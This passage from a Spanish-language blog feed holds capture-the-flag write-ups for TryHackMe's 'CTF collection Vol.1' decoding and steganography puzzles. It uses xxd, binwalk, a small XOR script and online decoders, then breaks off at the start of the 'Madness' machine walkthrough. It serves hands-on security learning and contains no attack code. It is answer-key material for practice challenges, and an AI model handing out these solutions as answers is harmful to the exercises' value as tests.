&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;3agrSy1CewF9v8ukcSkPSYm3oKUoByUpKG4L
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;strong&gt;Solucion:&lt;/strong&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/ctf_collection_vol1/Screenshot_20200212_174109.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;left-or-right&#34;&gt;Left or right&lt;/h3&gt;
&lt;p&gt;Left, right, left, right&amp;hellip; Rot 13 is too mainstream. Solve this&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Reto:&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;MAF&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;atbe_max_vtxltk&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;strong&gt;Solucion:&lt;/strong&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/ctf_collection_vol1/Screenshot_20200212_174159.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;make-a-comment&#34;&gt;Make a comment&lt;/h3&gt;
&lt;p&gt;No downloadable file, no ciphered or encoded text. Huh &amp;hellip;&amp;hellip;.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Solucion:&lt;/strong&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/ctf_collection_vol1/Screenshot_20200212_174340.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;can-you-fix-it&#34;&gt;Can you fix it?&lt;/h3&gt;
&lt;p&gt;I accidentally messed up with this PNG file. Can you help me fix it? Thanks, ^^&lt;/p&gt;
&lt;p&gt;Pasamos el archivo a Hexadecimal, editamos el archivo y reemplazamos la cantidad de &amp;ldquo;magic numbers&amp;rdquo; de un archivo PNG, luego de esto podemos obtener nuestra imagen renderizando la con CyberChef.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Reto:&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;➜  ctf_collection_vol1 xxd -p spoil.png &amp;gt; spoil_hex_data
➜  ctf_collection_vol1 head spoil
head: cannot open &lt;span class=&#34;s1&#34;&gt;&amp;#39;spoil&amp;#39;&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; reading: No such file or directory
➜  ctf_collection_vol1 head spoil_hex_data 
2333445f0d0a1a0a0000000d4948445200000320000003200806000000db
700668000000017352474200aece1ce9000000097048597300000ec40000
0ec401952b0e1b0000200049444154789cecdd799c9c559deff1cf799e5a
bb7a5f927477f640480209201150c420bba288a8805c19067c5d64c079e9
752e03ce38e30e8e2f75e63a23ea8c0ce8308e036470c191cd80880c4b20
0909184c42b64ed2e9f4bed7f23ce7fe51559dea4e27a4bbaaf7effbf5ea
57d2d5554f9daa7abafa7ceb9cf33bc65a6b1111111111111907ce443740
4444444444660e0510111111111119370a202222222222326e1440444444
444464dc28808888888888c8b8510011111111119171a300222222222222
e34601444444444444c68d028888888888888c1b0510111111111119370a
➜  ctf_collection_vol1 vim spoil_hex_data 
➜  ctf_collection_vol1 head spoil_hex_data
89504E470D0A1A0A0000000d4948445200000320000003200806000000db
700668000000017352474200aece1ce9000000097048597300000ec40000
0ec401952b0e1b0000200049444154789cecdd799c9c559deff1cf799e5a
bb7a5f927477f640480209201150c420bba288a8805c19067c5d64c079e9
752e03ce38e30e8e2f75e63a23ea8c0ce8308e036470c191cd80880c4b20
0909184c42b64ed2e9f4bed7f23ce7fe51559dea4e27a4bbaaf7effbf5ea
57d2d5554f9daa7abafa7ceb9cf33bc65a6b1111111111111907ce443740
4444444444660e0510111111111119370a202222222222326e1440444444
444464dc28808888888888c8b8510011111111119171a300222222222222
e34601444444444444c68d028888888888888c1b0510111111111119370a
➜  ctf_collection_vol1
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;strong&gt;Solucion:&lt;/strong&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/ctf_collection_vol1/Screenshot_20200212_175102.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;read-it&#34;&gt;Read it&lt;/h3&gt;
&lt;p&gt;Some hidden flag inside Tryhackme social account.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Solucion:&lt;/strong&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/ctf_collection_vol1/Screenshot_20200212_175333.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;spin-my-head&#34;&gt;Spin my head&lt;/h3&gt;
&lt;p&gt;What is this?&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Reto:&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;++++++++++&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&amp;gt;+&amp;gt;+++&amp;gt;+++++++&amp;gt;++++++++++&lt;span class=&#34;o&#34;&gt;&amp;lt;&amp;lt;&amp;lt;&lt;/span&gt;&amp;lt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&amp;gt;&amp;gt;&amp;gt;++++++++++++++.------------.+++++.&amp;gt;+++++++++++++++++++++++.&amp;lt;&amp;lt;++++++++++++++++++.&amp;gt;&amp;gt;-------------------.---------.++++++++++++++.++++++++++++.&amp;lt;++++++++++++++++++.+++++++++.&amp;lt;+++.+.&amp;gt;----.&amp;gt;++++.
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;strong&gt;Solucion:&lt;/strong&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/ctf_collection_vol1/Screenshot_20200212_175450.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;an-exclusive&#34;&gt;An exclusive!&lt;/h3&gt;
&lt;p&gt;Exclusive strings for everyone!&lt;br /&gt;
&lt;strong&gt;Reto:&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;S1: 44585d6b2368737c65252166234f20626d
S2: &lt;span class=&#34;m&#34;&gt;1010101010101010101010101010101010&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;strong&gt;Solucion:&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;script.py
&lt;span class=&#34;nv&#34;&gt;s1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;44585d6b2368737c65252166234f20626d&amp;#34;&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;s2&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;1010101010101010101010101010101010&amp;#34;&lt;/span&gt;

&lt;span class=&#34;nv&#34;&gt;a&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; hex&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;int&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;s1, 16&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; ^ int&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;s2, 16&lt;span class=&#34;o&#34;&gt;))[&lt;/span&gt;2:&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
print&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;bytes.fromhex&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;a&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.decode&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;utf-8&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;binary-walk&#34;&gt;Binary walk&lt;/h3&gt;
&lt;p&gt;Please exfiltrate my file :)&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Solucion:&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;➜  ctf_collection_vol1 binwalk hell.jpg 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
&lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;             0x0             JPEG image data, JFIF standard 1.02
&lt;span class=&#34;m&#34;&gt;30&lt;/span&gt;            0x1E            TIFF image data, big-endian, offset of first image directory: &lt;span class=&#34;m&#34;&gt;8&lt;/span&gt;
&lt;span class=&#34;m&#34;&gt;265845&lt;/span&gt;        0x40E75         Zip archive data, at least v2.0 to extract, uncompressed size: 69, name: hello_there.txt
&lt;span class=&#34;m&#34;&gt;266099&lt;/span&gt;        0x40F73         End of Zip archive, footer length: &lt;span class=&#34;m&#34;&gt;22&lt;/span&gt;

➜  ctf_collection_vol1 binwalk hell.jpg -e

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
&lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;             0x0             JPEG image data, JFIF standard 1.02
&lt;span class=&#34;m&#34;&gt;30&lt;/span&gt;            0x1E            TIFF image data, big-endian, offset of first image directory: &lt;span class=&#34;m&#34;&gt;8&lt;/span&gt;
&lt;span class=&#34;m&#34;&gt;265845&lt;/span&gt;        0x40E75         Zip archive data, at least v2.0 to extract, uncompressed size: 69, name: hello_there.txt
&lt;span class=&#34;m&#34;&gt;266099&lt;/span&gt;        0x40F73         End of Zip archive, footer length: &lt;span class=&#34;m&#34;&gt;22&lt;/span&gt;

➜  ctf_collection_vol1 ls
Extinction.jpg     Findme.jpg  _hell.jpg.extracted  help.txt  spoil_hex_data  ti.py
Final_message.txt  hell.jpg    hello.hello          img       spoil.webp
➜  ctf_collection_vol1 ls _hell.jpg.extracted 
40E75.zip  hello_there.txt
➜  ctf_collection_vol1 cat _hell.jpg.extracted/hello_there.txt
Thank you &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; extracting me, you are the best!

THM&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;... snip ...&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
➜  ctf_collection_vol1
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;darkness&#34;&gt;Darkness&lt;/h3&gt;
&lt;p&gt;There is something lurking in the dark.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Solucion:&lt;/strong&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/ctf_collection_vol1/Screenshot_20200212_181130.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;a-sounding-qr&#34;&gt;A sounding QR&lt;/h3&gt;
&lt;p&gt;How good is your listening skill?&lt;/p&gt;
&lt;p&gt;P/S: The flag formatted as THM{Listened Flag}, the flag should be in All CAPS&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Solucion:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;QR:&lt;/strong&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/ctf_collection_vol1/Screenshot_20200212_181410.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Descargamos el archivo de audio y utilizamos &lt;a href=&#34;https://speech-to-text-demo.ng.bluemix.net/&#34;&gt;&lt;strong&gt;Speech to Text&lt;/strong&gt;&lt;/a&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/ctf_collection_vol1/Screenshot_20200212_182341.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;dig-up-the-past&#34;&gt;Dig up the past&lt;/h3&gt;
&lt;p&gt;Sometimes we need a &amp;lsquo;machine&amp;rsquo; to dig the past.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Reto:&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;Targetted website: https://www.embeddedhacker.com/
Targetted time: &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; January &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Utilizamos &lt;strong&gt;web.archive.org&lt;/strong&gt; para obtener nuestra flag en la fecha descrita.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Solucion:&lt;/strong&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/ctf_collection_vol1/Screenshot_20200212_182556.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;uncrackable&#34;&gt;Uncrackable!&lt;/h3&gt;
&lt;p&gt;Can you solve the following? By the way, I lost the key. Sorry &amp;gt;.&amp;lt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Reto:&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;MYKAHODTQ&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;RVG_YVGGK_FAL_WXF&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;

Flag format: TRYHACKME&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;FLAG IN ALL CAP&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Utilizamos Vignere Decoder para obtener primero la KEY, utilizamos el formato del flag como KEY (TRYHACKME), luego de eso utilizamos el mismo formato de lo que obtuvimos.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Solucion:&lt;/strong&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/ctf_collection_vol1/Screenshot_20200212_183103.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/ctf_collection_vol1/Screenshot_20200212_183121.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;small-bases&#34;&gt;Small bases&lt;/h3&gt;
&lt;p&gt;Decode the following text.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Reto:&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;m&#34;&gt;581695969015253365094191591547859387620042736036246486373595515576333693&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;strong&gt;Solucion:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.rapidtables.com/convert/number/decimal-to-hex.html&#34;&gt;&lt;strong&gt;Decimal &amp;gt; Hex&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.rapidtables.com/convert/number/hex-to-ascii.html&#34;&gt;&lt;strong&gt;Hex - Ascii&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&#34;read-the-packet&#34;&gt;Read the packet&lt;/h3&gt;
&lt;p&gt;I just hacked my neighbor&amp;rsquo;s WiFi and try to capture some packet. He must be up to no good. Help me find it.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Solucion:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;HTTP Wireshark.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/ctf_collection_vol1/Screenshot_20200212_185601.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/thm/ctf_collection_vol1/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/thm/ctf_collection_vol1/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>challenge</category>
            
          
        
        
          
            
              <category>tryhackme</category>
            
          
        
        
      </item>
      
      <item>
        <title>TryHackMe - Madness</title>
        <link>https://sckull.github.io/posts/madness_thm/</link>
        <pubDate>Wed, 12 Feb 2020 00:00:00 +0000</pubDate>
        
        <atom:modified>Wed, 12 Feb 2020 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/madness_thm/</guid>
        <description>Madness es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.</description>
        <content:encoded>&lt;p&gt;Madness es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/thm/madness/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Titulo&lt;/th&gt;
&lt;th&gt;Madness&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Info&lt;/td&gt;
&lt;td&gt;Will you be consumed by Madness?&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Puntos&lt;/td&gt;
&lt;td&gt;416&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Dificultad&lt;/td&gt;
&lt;td&gt;Facil&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Maker&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://tryhackme.com/p/Optional&#34;&gt;Optional&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;nmap&#34;&gt;NMAP&lt;/h2&gt;
&lt;p&gt;Escaneo de puertos tcp/udp, nmap nos muestra el puerto http (80) y el puerto ssh (22) abiertos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
